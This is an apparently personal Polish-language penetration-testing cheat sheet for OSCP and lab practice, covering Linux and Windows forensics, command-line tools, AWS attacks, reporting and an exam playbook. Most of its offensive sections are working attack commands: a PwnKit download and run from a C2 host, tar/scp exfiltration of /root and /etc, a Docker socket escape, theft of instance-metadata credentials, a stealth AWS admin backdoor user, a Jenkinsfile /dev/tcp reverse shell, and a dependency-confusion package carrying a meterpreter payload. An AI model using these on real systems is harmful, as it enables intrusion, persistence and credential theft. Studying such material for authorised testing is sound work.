ps aux | egrep "edr|splunk|elastic"                   # szukanie narzędzi security
uname -r                                              # wersja kernela (np. stary 4.4)
# Faza 2: Download do /tmp + kompilacja exploita
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c
gcc /tmp/pwnkit.c -o /tmp/pwnkit; chmod +x /tmp/pwnkit; /tmp/pwnkit
# Faza 3: Exfil przez SCP
tar czf dump.tar.gz /root /etc/
scp dump.tar.gz attacker@c2-server.thm:~
```

## 11.2 Linux — ausearch (audyt)
```bash
ausearch -i -x socat                                  # podejrzane komendy po nazwie
ausearch -i --pid 27806                               # proces rodzic → drzewo procesów
ausearch -i --ppid 27808 | grep proctitle             # procesy potomne
ausearch -i -f /etc/systemd                           # zmiany plików w katalogu
```

## 11.3 Windows — analiza plików
Hash pliku:
```powershell
Get-FileHash -Algorithm SHA256 .\file.exe
certutil -hashfile filename.exe SHA256
```
Strings / grep:
```powershell
Select-String -Path .\file.txt -Pattern "http"
Select-String -Path "C:\Logs\access.log" -Pattern "admin" -CaseSensitive
findstr /i "password" file.txt
Get-Process | Select-String "sql"                     # procesy z 'sql'
```
Metadane i podpis cyfrowy:
```powershell
Get-Item .\suspicious_file.exe | Select-Object *
Get-AuthenticodeSignature .\installer.exe             # czy podpisany/zaufany
```
Hex / magic bytes:
```powershell
Format-Hex .\file.exe | select -first 5
```
DLL — co ładuje proces:
```cmd
tasklist /m                                           :: wszystkie używane DLL
tasklist /m /fi "IMAGENAME eq notepad.exe"            :: DLL notepada
tasklist /m /fi "modules eq malicious.dll"            :: kto używa danej DLL
```
Certutil dekodowanie/enkodowanie:
```cmd
certutil -decode plik.b64 plik                        :: dekoduj base64
certutil -encode plik plik.b64                        :: enkoduj base64
```
Ukryte bajty wykonywalne w skrypcie:
```bash
xxd suspicious_script.sh | head -n 20
```

---

# 12. Toolbox — Reference

> Narzędzia bazowe i systemowe, przydatne na każdym etapie.

## 12.1 grep (Extended Regex)
```bash
grep -E "Failed|Accepted" /var/log/auth.log           # alternatywa | — udane/nieudane logowania
grep -E "log+"                                        # \+ jeden lub więcej: log, logg, loggg
grep -E "https?"                                      # ? zero lub jeden: http oraz https
grep -E "[0-9]{1,3}"                                  # {n,m} od 1 do 3 cyfr
grep -Eo "\b[a-z]{3}\.[a-z0-9]+\.[a-z]{3}\b"          # \b granica słowa: 3litery.wielo.3litery
grep -A 5 "cos"                                       # 5 linii PO
grep -B 5 "cos"                                       # 5 linii PRZED
grep -C 5 "cos"                                       # 5 linii wokół
grep -rniE "wzorzec" /sciezka                         # -r rekursywnie -n numery -i ignore case
```

## 12.2 awk
```bash
awk -F'[][]' '{print $2}' rpc_wynik.txt > users.txt   # separator [ oraz ], drukuj 2. kolumnę
awk '{print $1}' access.log | sort | uniq -c | sort -rn   # top IP z logu
```

## 12.3 find
```bash
sudo find / -name ".env.local" -type f 2>/dev/null    # po nazwie
find . -iname "*monkey*"                              # -iname = bez wielkości liter
find / -writable -type d 2>/dev/null                  # zapisywalne katalogi (privesc)
find / -perm -u=s -type f 2>/dev/null                 # SUID (privesc)
find / -mmin -10 2>/dev/null                          # pliki zmienione w ostatnich 10 min
```

## 12.4 xxd (hex)
```bash
xxd plik.bin                          # podgląd Offset | Hex | ASCII
xxd -l 16 plik.bin                    # -l 16 = pierwsze 16 bajtów (magic bytes / nagłówek)
xxd -p plik.txt                       # czysty hex (do skryptów)
xxd -c 8 plik.bin                     # -c 8 = 8 bajtów na linię
xxd -r zrzut_hex.txt > plik.bin       # -r reverse: hex → binarka
xxd -i plik.bin                       # eksport jako char[] (shellcode do exploita)
```

## 12.5 netstat (flagi)
```
-a  listening + non-listening    -l  tylko listening    -n  numerycznie (bez DNS)
-t  TCP    -u  UDP    -x  UNIX    -p  PID + nazwa procesu
```

## 12.6 Analiza plików / malware
```bash
olevba <plik.doc>                     # wyciąga makra VBA
vol -f memorydump.raw -h              # Volatility: lista modułów zrzutu RAM
strings -n 8 plik.bin | less          # czytelne stringi
file plik.bin                         # rozpoznanie typu po magic bytes
binwalk -e plik.bin                   # ekstrakcja osadzonych plików
```

## 12.7 hash_extender (length extension attack)
> 🔗 https://github.com/iagox86/hash_extender
> Znając hash końcowy pliku, dołączasz dane bez znajomości sekretu (jeśli podpis = `hash(secret + data)`).
```bash
./hash_extender --data 1.png --signature 02d101c0ac898f9e69b7d6ec1f84a7f0d784e59bbbe057acb4cef2cf93621ba9 --append /../4.png --out-data-format=html
# --data oryginał | --signature oryginalny hash | --append doklejane dane
# --out-data-format=html format wyjścia | --format md5 zmiana algorytmu (domyślnie SHA256)
```

## 12.8 Docker escape
```bash
ls -la /var/run/docker.sock                           # 1. czy jest socket Dockera
docker                                                # czy mamy klienta (jak nie → ręczne API przez curl)
docker -H unix:///var/run/docker.sock ps              # lista kontenerów hosta
docker -H unix:///var/run/docker.sock images          # dostępne obrazy
# Zamontuj system hosta w kontenerze i wejdź jako root:
docker -H unix:///var/run/docker.sock run -it -v /:/mnt/matka --rm php:8.1-cli chroot /mnt/matka bash
# php:8.1-cli = znaleziony obraz | -v /:/mnt/matka montuje root hosta | --rm sprząta ślady
lsblk                                                 # (lub fdisk -l) urządzenia do montowania
capsh --print                                         # capabilities kontenera
```
> Wersje z ręcznym API (bez klienta docker):
> `curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json`

## 12.9 Skanery podatności / hosting
```bash
sudo systemctl start nessusd.service                  # Nessus → https://127.0.0.1:8834
sudo neo4j start                                       # baza pod BloodHound
```

## 12.10 Git (workflow tej ściągi)
```bash
git status                            # co się zmieniło
git add nazwa_folderu/plik.md         # staging
git commit -m "Opis zmian"            # commit
git push origin main                  # push
git pull origin main                  # pull
```

---

# 13. Cloud — AWS (enumeracja i atak)

> Coraz częściej cel to konto w chmurze, nie serwer. Fundament AWS: **S3** (storage), **IAM** (tożsamości/uprawnienia), **EC2** (VM), **Lambda** (funkcje). Klucz `AKIA...` + secret = tożsamość stała; `ASIA...` + SessionToken = tymczasowa (rola). Zawsze w granicach zakresu.

> 🎯 **Drogowskaz — co po kolei (AWS):**
> 1. **Bez kluczy** — potwierdź, że to AWS: `host -t ns` + `whois` (`awsdns-*` → Route53, reverse-DNS `ec2-*.compute-1.amazonaws.com` → EC2). §13.1.
> 2. **Znajdź buckety** — nazwa w źródle strony (DevTools Network / `curl|grep`); stany: **XML=OPEN** · **AccessDenied=istnieje+chroniony** · **NoSuchBucket=brak**. Brute: `cloud_enum -kf`.
> 3. **Odzyskaj Account ID** (12 cyfr) — z publicznego AMI (`OwnerId`) lub brute `s3:ResourceAccount`; potem sprawdzaj istnienie principali i brute ról w **Pacu** (`iam__enum_roles` → auto-AssumeRole = creds `ASIA...`).
> 4. **Z kluczami** — kim jestem: `sts get-caller-identity` (cicho: `get-access-key-info` / `lambda invoke` błąd / zmiana `--region`).
> 5. **Zakres uprawnień** — inline + grupy + wersje managed; jeden `get-account-authorization-details` i filtruj `--query` offline.
> 6. **Eskaluj** — `iam:CreateAccessKey`/`AddUserToGroup`/`PutUserPolicy`/`AssumeRole`, `*:*`, ABAC-tagi. **Loot**: bucket z `.git` (§13.5), poison CI/CD (§13.6), `terraform.tfstate` (§13.8).
>
> 💎 **Co wartościowe:** klucz `AKIA/ASIA...`+secret w źródle/plikach/IMDS/`env` · **12-cyfrowy Account ID** · bucket OPEN · publiczne AMI/snapshoty z sekretami · **`.git` w buckecie** (cała historia!) · `withAWS` w Jenkinsfile · **`terraform.tfstate`** (plaintext IAM admin) · statementy `iam:*`/`*:*` · `get-account-summary`: MFA=0.

## 13.1 Rozpoznanie bez kluczy (unauthenticated)
Najpierw potwierdź, że cel to w ogóle AWS:
```bash
host -t ns $DOMAIN                                    # nameservery awsdns-* → AWS Route53
whois awsdns-00.com | grep 'Registrant Organization' # Amazon Technologies Inc.
host $IP                                              # reverse-DNS ec2-*.compute-1.amazonaws.com → EC2
whois $IP | grep 'OrgName'                            # OrgName: Amazon...
```
Znajdź i sklasyfikuj buckety S3 (nazwa często wycieka w źródle strony — DevTools → Network):
```bash
curl -s http://$DOMAIN | grep -oP '[a-z0-9.-]+\.s3[.-][a-z0-9-]*\.amazonaws\.com'   # wyłuskaj URL bucketu
curl -i http://<bucket>.s3.amazonaws.com/            # XML z <Key> = OPEN · AccessDenied = jest+chroniony · NoSuchBucket = brak
aws s3 ls s3://<bucket> --no-sign-request            # anonimowy listing (gdy public)
aws s3 cp s3://<bucket>/README.md ./ --no-sign-request
```
Brute nazw bucketów (konwencja `org-cel-<8 losowych>`; ten sam suffix bywa reużyty):
```bash
cloud_enum -kf keyfile.txt --quickscan --disable-azure --disable-gcp   # -k KEYWORD lub -kf plik; etykiety OPEN vs Protected
```
> **Region siedzi w URL bucketu** (`...s3.us-east-1...`) — użyj go w `aws configure`. `AccessDenied` na anon ≠ bucket zamknięty (spróbuj z uwierzytelnieniem — patrz §13.5). Domeny do brute: `s3.amazonaws.com`, `awsapps.com` (AWS), `*.core.windows.net`/`azurewebsites.net` (Azure), `storage.googleapis.com`/`appspot.com` (GCP).

> SSRF na instancji EC2 → kradzież tymczasowych creds roli z IMDS: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<rola>` (IMDSv2: najpierw `PUT .../api/token` z nagłówkiem, potem `GET` z `X-aws-ec2-metadata-token`).

## 13.1b Bez kluczy, ale cross-account (Account ID → principale → role)
```bash
# Odzyskaj 12-cyfrowy Account ID:
aws --profile attacker ec2 describe-images --executable-users all --filters "Name=name,Values=*Cel*"  # OwnerId = Account ID
# Sprawdź, czy dany user/rola ISTNIEJE w cudzym koncie (cała interakcja w TWOIM koncie):
aws --profile attacker s3api put-bucket-policy --bucket <mój-dummy> --policy file://grant.json
#   przechodzi (brak outputu) = principal ISTNIEJE; 'Invalid principal in policy' = NIE istnieje (mylący komunikat!)
# Brute nazw ról + auto-AssumeRole w Pacu → tymczasowe creds ASIA...:
pacu
Pacu> import_keys attacker
Pacu> run iam__enum_roles --word-list role-names.txt --account-id <AccountID>
Pacu> run iam__enum_users --word-list user-names.txt --account-id <AccountID>
```
> Principal ARN: `arn:aws:iam::<AccountID>:user/<nazwa>` (lub `role/`, `group/`). `iam__enum_roles` przy trafieniu **sam próbuje AssumeRole** → zwraca `ASIA...`+SessionToken (Initial Compromise). Używaj kluczy *attacker* — moduł spamuje **Twój** CloudTrail, cel nic nie widzi. Wordlisty buduj z prefiksów projektów doklejanych do nazw ról.

## 13.2 Konfiguracja CLI z pozyskanymi kluczami
```bash
aws configure --profile target                       # wklej AKIA..., secret, region (np. us-east-1)
aws --profile target sts get-caller-identity         # kim jestem (ARN, account id) — UWAGA: leci do CloudTrail
aws --profile target sts get-access-key-info --access-key-id AKIA...   # do jakiego konta należy klucz (cicho, offline-ish)
```
Warianty **stealth** (gdy nie chcesz zapalać `get-caller-identity` w logach celu):
```bash
aws --profile target sts get-access-key-info --access-key-id AKIA...   # ujawnia Account ID bez logu u celu
aws --profile target lambda invoke --function-name arn:aws:lambda:us-east-1:<acct>:function:nonexistent out.json  # błąd zdradza tożsamość
aws --profile target sts get-caller-identity --region us-east-2        # zmiana regionu bywa mniej monitorowana
```
Dla creds tymczasowych z roli (`ASIA...`) dopisz `aws_session_token` do profilu:
```bash
aws configure set aws_session_token "<token>" --profile target
```
## 13.3 Enumeracja uprawnień (IAM) — dokąd mogę pójść
```bash
aws --profile target iam list-users
aws --profile target iam list-groups
aws --profile target iam list-roles
aws --profile target iam list-attached-user-policies --user-name bob
aws --profile target iam list-user-policies --user-name bob            # polityki INLINE (łatwo przeoczyć)
aws --profile target iam list-groups-for-user --user-name bob          # grupy → potem list-group-policies
aws --profile target iam get-account-authorization-details    # PEŁNY zrzut IAM (users+groups+policies+roles) — jeden strzał
aws --profile target iam get-account-summary | grep MFA               # MFADevices=0 = konto bez MFA
aws --profile target iam get-policy-version --policy-arn <ARN> --version-id v1
```
> Uprawnienia siedzą w 3 miejscach: **inline** (`list-user-policies`), **managed** (`list-attached-user-policies` + `get-policy-version`), **przez grupy** (`list-groups-for-user`). Zrób jeden `get-account-authorization-details` i filtruj offline: `--query 'UserDetailList[?UserName==\`bob\`]'` / `--filter LocalManagedPolicy`. Szukaj eskalacji: `iam:CreateAccessKey`, `iam:PutUserPolicy`, `iam:AttachUserPolicy`, `iam:AddUserToGroup`, `sts:AssumeRole`, `*:*`, tagi **ABAC** (`Project=...` sterujące dostępem).

## 13.4 Ruch dalej / eskalacja (przykłady)
```bash
# S3 — pobierz dane z prywatnych bucketów, do których masz dostęp:
aws --profile target s3 ls firma-assets-private
aws --profile target s3 sync s3://firma-assets-private ./loot
# EC2 — cudze AMI / snapshoty (mogą zawierać sekrety):
aws --profile target ec2 describe-images  --owners <acct> --executable-users all
aws --profile target ec2 describe-snapshots --filters "Name=description,Values=*prod*"
# Lambda — wylistuj i wywołaj funkcję:
aws --profile target lambda invoke --function-name <arn> out.json
# IAM privesc (gdy masz PutUserPolicy): dołóż sobie politykę admina:
aws --profile target iam put-user-policy --user-name bob --policy-name pe --policy-document file://admin.json
# Persistencja: nowy klucz dostępu do przejętego usera:
aws --profile target iam create-access-key --user-name bob
```
> Automatyzacja audytu/ataku IAM: **Pacu**, **ScoutSuite**, **enumerate-iam**.

**Backdoor-admin (trwały stealth-admin, T1136.003):**
```bash
aws --profile compromised iam create-user --user-name terraform-svc      # stealth nazwa, nie "backdoor"
aws --profile compromised iam attach-user-policy --user-name terraform-svc --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws --profile compromised iam create-access-key --user-name terraform-svc # SecretAccessKey zwracany RAZ — zapisz od razu!
aws configure --profile backdoor
```
> Tworzenie userów leci do CloudTrail — używaj wiarygodnej nazwy. `AdministratorAccess` ARN = `arn:aws:iam::aws:policy/AdministratorAccess`.

## 13.5 S3 misconfig `AuthenticatedUsers` + repo `.git` w buckecie
> Bucket blokuje anon (`AccessDenied`), ale ACL `AuthenticatedUsers` = **każdy zalogowany user AWS** (nawet z obcego konta) może czytać. Dowolne ważne `AKIA` działają.
```bash
curl -i https://<bucket>.s3.<region>.amazonaws.com   # AccessDenied XML = anon zablokowany, ale...
aws configure                                         # wklej JAKIEKOLWIEK ważne IAM creds
aws s3 ls s3://<bucket>                               # region MUSI pasować do URL bucketu
aws s3 sync s3://<bucket> ./loot                      # ściąga CAŁOŚĆ, łącznie z ukrytym .git/
```
Jeśli w buckecie jest `.git/` (dirb znajdzie `.git/HEAD` = 200) — masz całe repo z **historią** (usunięte sekrety wciąż ważne!):
```bash
head -n 51 /usr/share/wordlists/dirb/common.txt > first50.txt
dirb https://<bucket>.s3.<region>.amazonaws.com ./first50.txt     # szuka .git/HEAD
aws s3 sync s3://<bucket> ./repo                      # NIE brute'uj obiektów git — ściągnij .git i pracuj lokalnie
cd repo && git log --oneline --all
git show <commit>                                     # zwłaszcza commity "Fix issue" gdzie usunięto sekret
echo 'YWRtaW46cGFzcw==' | base64 -d                   # nagłówek Authorization: Basic <b64> = user:pass
gitleaks detect                                       # POMOCNICZO — "no leaks" NIE kończy tematu, rób ręczny git log/show
```

## 13.6 Poison the pipeline (CI/CD → RCE → kradzież AWS creds)
> Masz creds do Gitea/GitLab z sekretów? Edytuj **Jenkinsfile** w repo z webhookiem Git Push → build się odpala → shell na builderze jako `jenkins`.
```groovy
pipeline { agent any stages { stage('x') { steps {
  withAWS(region:'us-east-1', credentials:'aws_key') { script {
    if (isUnix()) { sh 'bash -c "bash -i >& /dev/tcp/<mójIP>/4242 0>&1" & ' }   // trailing & KONIECZNE (inaczej step timeoutuje)
  } } } } } }
```
```bash
# Kali z PUBLICZNYM IP (chmurowy) — lokalny nie zadziała:
sudo systemctl start apache2 && tail -f /var/log/apache2/access.log   # test: sh 'curl http://<mójIP>/x' → sprawdź hit
nc -nvlp 4242                                         # złap reverse shell
```
> Używaj `sh` (nie Groovy — Groovy w sandboxie wymaga script approval). Po shellu na builderze — wyciągnij AWS creds wstrzyknięte przez `withAWS`:
```bash
env | grep AWS                                        # AWS_ACCESS_KEY_ID/SECRET → najszybsza droga do chmury
cat /proc/1/status | grep Cap; capsh --decode=<CapEff> # 3fffffffff = privileged (escape)
cat /proc/mounts | grep overlay                       # overlay + brak ifconfig = kontener Docker
```

## 13.7 Dependency confusion (przejęcie prywatnego pakietu pip)
> Gdy app to Python i używa `extra-index-url` (szuka w OBU indexach, bierze **najwyższą** wersję) — opublikuj na publicznym PyPI wyższą wersję prywatnego pakietu → prod ją zaciągnie.
```bash
# OSINT nazwy: requirements.txt / forum / nagłówki Server: Werkzeug (=Python). Sprawdź, że pakiet "brakuje":
pip download <pakiet>                                 # "No matching distribution" = confusion możliwy
# Złośliwy pakiet: RCE przy install (setup.py cmdclass) I przy import (utils.py __getattr__ + sys.excepthook)
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<mójIP> LPORT=4488   # dopisz na KONIEC utils.py
python3 ./setup.py sdist
twine upload --repository-url http://<pypi.cel>/ -u user -p pass dist/*      # wersja > prywatnej (~=1.1.0 → 1.1.2+)
# handler: msfconsole -x 'use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4488; set ExitOnSession false; run -jz'
```
> Prod przebudowuje zwykle ≤10 min. Nazwa pakietu: `from foo_util import x` → pakiet `foo-util` (dash), moduł `foo_util` (underscore). `remove_pkg` przez `curl --form ':action=remove_pkg'` by posprzątać zły upload.

## 13.8 Terraform state = klucze admina (JACKPOT) + pivot
> Bucket `tf-state-*` trzyma `terraform.tfstate` = **plaintext** IAM id+secret+polityki. User z `AdministratorAccess` = pełna kompromitacja. Klucze do bucketu bywają w źródle strony Jenkins **S3 Explorer** (client-side JS).
```bash
aws --profile stolen s3api list-buckets              # ujawnia bucket tf-state-*
aws --profile stolen s3 cp s3://tf-state-<x>/terraform.tfstate ./
cat -n terraform.tfstate                             # grep users + access id + secret + attached policy
aws configure --profile admin                        # id/secret usera z AdministratorAccess
aws --profile admin iam list-attached-user-policies --user-name <user>
```
Pivot do sieci wewnętrznej z kontenera **bez nmapa** (czysty Python — `socket`/`ipaddress`):
```bash
# netscan.py: socket.connect_ex()==0 = open; settimeout(0.2); skanuj /24 nie /16
python /netscan.py 172.30.0.1/24                      # np. wewnętrzny Jenkins 172.30.0.30:8080
```
> ⚠️ **Cleanup labu:** `sudo nmcli connection modify 'Wired connection 1' ipv4.dns '' && sudo systemctl restart NetworkManager` (inaczej psujesz sobie DNS), `rm ~/.pypirc ~/.config/pip/pip.conf`, usuń Firefox SOCKS proxy.

---

# 14. Reporting & Technical Report

> Zaangażowanie kończy się **raportem** — to on ma wartość dla klienta (i punkty na OSCP: dodatkowe 24h na raport). Notuj OD RAZU, nie po fakcie.

## 14.1 Notatki w trakcie
> Zapisuj na bieżąco: komendy, output, screenshoty (z widocznym IP celu + `whoami`), znalezione creds. Narzędzia: **Obsidian**, **CherryTree**, **Sysreptor**, **Joplin**. Screeny trzymaj w jednym folderze per host.
```bash
# Szybki dowód na maszynie (do wklejenia w raport):
hostname; whoami; ip a | grep inet          # Linux
cat /root/proof.txt 2>/dev/null; cat /home/*/local.txt 2>/dev/null
# Windows: type C:\Users\Administrator\Desktop\proof.txt & ipconfig & whoami
```
## 14.2 Struktura raportu (OSCP / komercyjny)
> 1. **Executive Summary** — dla zarządu, bez żargonu: co, jak źle, co dalej.
> 2. **Scope & Methodology** — zakres (IP/domeny), okno czasowe, podejście (PTES/OSSTMM).
> 3. **Findings** — każde znalezisko: opis, **risk/CVSS**, dowód (**PoC** + screeny), **kroki reprodukcji**, **remediation** (konkretna rekomendacja).
> 4. **Attack Narrative / Walkthrough** — chronologiczny łańcuch: enumeracja → exploit → privesc → lateral, krok po kroku. Kluczowe na OSCP — oceniający musi ODTWORZYĆ Twoją drogę.
> 5. **Appendices** — pełne outputy, lista creds, użyte narzędzia.

> ✍️ Zasady: każdy krok reprodukowalny; screeny czytelne (IP + proof widoczne); dla OSCP dołącz `local.txt`/`proof.txt` z każdej maszyny. Brak reprodukowalności = brak punktów, nawet gdy „miałeś” roota.

---

# Appendix A — Skróty klawiszowe shell (readline)

| Akcja | Skrót | Mnemonik |
|-------|-------|----------|
| Przesuń o wyraz do przodu | `Alt + F` | **F**orward |
| Przesuń o wyraz do tyłu | `Alt + B` | **B**ackward |
| Na początek linii | `Ctrl + A` | **A** — pierwsza litera |
| Na koniec linii | `Ctrl + E` | **E**nd |
| Usuń wyraz do tyłu | `Ctrl + W` (lub `Alt + Backspace`) | **W**ord (w lewo) |
| Usuń wyraz do przodu | `Alt + D` | **D**elete (w prawo) |
| Usuń wszystko na lewo | `Ctrl + U` | od kursora do początku |
| Usuń wszystko na prawo | `Ctrl + K` | **K**ill (do końca) |
| Wyczyść ekran | `Ctrl + L` | c**L**ear |
| Szukaj w historii | `Ctrl + R` | **R**everse search |
| Przerwij / wklej ostatni kill | `Ctrl + C` / `Ctrl + Y` | Yank |

---

---

# Appendix B — OSCP Exam Playbook / Metodyka

> Egzamin: **~24h + 24h na raport**. Zwykle 3 maszyny standalone (po 20 pkt) + zestaw AD (40 pkt, łańcuch 3 hostów). **70/100** do zdania.
> Konfiguracja może się zmieniać — sprawdź aktualny Exam Guide OSCP przed podejściem.

## B.1 Zasady, które ratują egzamin
- **AD najpierw albo standalone najpierw?** Jeśli masz AD (40 pkt) — często opłaca się je zrobić w całości (all-or-nothing: 3 hosty łańcuchem). Ale jak utkniesz >2h, przełącz się na standalone i wróć.
- **Rób screenshoty NA BIEŻĄCO** — każdy `whoami`, `hostname`, `ip a` na maszynie + `type proof.txt` / `cat proof.txt`. Bez proofa = 0 punktów, nawet z rootem.
- **Rób notatki NA BIEŻĄCO** (CherryTree / Obsidian / Sublime) — komenda + output. Raport piszesz z notatek, nie z pamięci.
- **Restartuj maszynę** jeśli exploit się „zużył" / usługa padła (panel egzaminacyjny ma revert).
- **Metasploit: limit** — możesz użyć MSF/meterpreter na **JEDNEJ** maszynie standalone. `multi/handler` i msfvenom nie liczą się do limitu. Nie marnuj limitu za wcześnie.
- **Zakazane:** narzędzia automatyzujące eksploitację (sqlmap na exam targets — dozwolone tylko do identyfikacji, nie do exploitacji; commercial tools; automatyczne exploit skanery jak Autorecon jest OK do enumeracji). Sprawdź aktualną listę zakazów!
- **Try harder = try different**. Utknąłeś? → wróć do enumeracji. 90% blokad to pominięty port/plik/parametr.

## B.2 Metodyka na każdą maszynę (pętla)
```
1. FULL nmap (-p- -sV -sC)  +  UDP top-ports. Zapisz każdy port.
2. Dla KAŻDEJ usługi: wersja → searchsploit → default creds → ręczna enumeracja.
3. Web: gobuster/ffuf + ręczne klikanie + view-source + /robots.txt. Każdy input testuj (SQLi/LFI/upload/cmdi).
4. Znalazłeś ślad? Wyeksploatuj → foothold → STABILIZUJ shell (TTY).
5. Post-exploit enum: linpeas/winpeas. Przejrzyj CAŁY output.
6. Privesc → root/SYSTEM → proof.txt + screenshot.
7. Loot: hasła, hashe, klucze SSH → mogą otworzyć następny host (pivoting/AD).
```
```bash
searchsploit <usługa> <wersja>          # szukaj gotowych exploitów lokalnie
searchsploit -m 12345                    # skopiuj exploit do bieżącego katalogu
```

## B.3 Checklist enumeracji per-port (najczęstsze wektory)
| Port | Usługa | Pierwsze kroki |
|------|--------|----------------|
| 21 | FTP | anon login (`ftp $IP` → anonymous), `ls`, wersja → searchsploit |
| 22 | SSH | wersja, klucze z lootu, `-oPubkeyAuthentication` |
| 25 | SMTP | `VRFY user` (enum userów), open relay |
| 53 | DNS | zone transfer `dig axfr` |
| 80/443 | HTTP(S) | gobuster/ffuf, whatweb, source, SSL cert (nazwy!), vhosts |
| 111 | RPCbind | `rpcinfo -p $IP`, NFS |
| 139/445 | SMB | enum4linux-ng, smbclient -N, smbmap, wersja → EternalBlue? |
| 161 | SNMP | snmpwalk, community strings |
| 389/636 | LDAP | ldapsearch anon bind |
| 1433 | MSSQL | impacket-mssqlclient, xp_cmdshell |
| 2049 | NFS | `showmount -e $IP`, mount + no_root_squash privesc |
| 3306 | MySQL | default creds, wersja |
| 3389 | RDP | xfreerdp, BlueKeep? |
| 5985/5986 | WinRM | evil-winrm z creds/hash |
| 6379 | Redis | unauth `redis-cli -h $IP`, webshell/SSH key write |

```bash
showmount -e $IP                         # NFS eksporty — szukaj no_root_squash → privesc
rpcinfo -p $IP                           # co RPC wystawia
smbclient -L //$IP -N                    # SMB anon
```

## B.4 Najczęstsze pułapki (rabbit holes)
- **Pominięty port** — skanuj **-p-**, nie top-1000. UDP też (SNMP/TFTP/SMTP).
- **Nie przeczytany cały linpeas/winpeas** — odpowiedź często jest w środku (żółto-czerwone highlighty).
- **Nie przetestowany każdy input** — parametry GET/POST, nagłówki (User-Agent, X-Forwarded-For, Cookie).
- **Ignorowanie `sudo -l`** i `whoami /priv` — pierwsza rzecz po foothold.
- **Reużycie haseł** — hasło z jednej usługi/hosta próbuj wszędzie (spray).
- **Za wczesne palenie MSF** na maszynie, która ma prosty ręczny exploit.
- **Grzebanie w exploicie zamiast enumeracji** — jak coś nie działa 30 min, wróć do enum.

## B.5 Proof i raport
```bash
# Zbierz dowód na każdej maszynie:
whoami && hostname && ip a          # (Linux) / whoami && hostname && ipconfig  (Windows)
cat proof.txt                       # / type proof.txt
```
- Raport w **Markdown → PDF**, szablon OffSec. Każdy krok: opis + komenda + screenshot + output.
- Musi być **odtwarzalny** — ktoś inny ma powtórzyć atak z Twojego raportu.
- Deadline raportu to twarde 24h po egzaminie. Pisz notatki tak, żeby raport = przeklejka + opis.

## B.6 Arsenał do przećwiczenia PRZED egzaminem
`nmap` • `ffuf`/`gobuster` • `searchsploit` • `linpeas`/`winpeas`/`pspy` • `hydra` •
`impacket-*` (psexec/wmiexec/secretsdump/GetNPUsers/GetUserSPNs) • `evil-winrm` •
`crackmapexec/netexec` • `chisel`/`ligolo-ng` (pivoting!) • `mimikatz`/`Rubeus` •
`BloodHound` • `xfreerdp` • ręczne PtH/PtT/PtK.
> 🔗 Trening: PG Practice (Proving Grounds), HTB (OSCP-like list TJ_Null), TryHackMe (ścieżki AD/Offensive).

---

> **Uwaga o utrzymaniu pliku:** dopisuj nowe komendy do właściwej fazy kill chain, a nie na koniec.
> Gdy komenda pasuje do kilku faz (np. `smbclient` — recon i lateral), trzymaj ją w fazie *pierwszego* użycia i linkuj/wspominaj w drugiej.
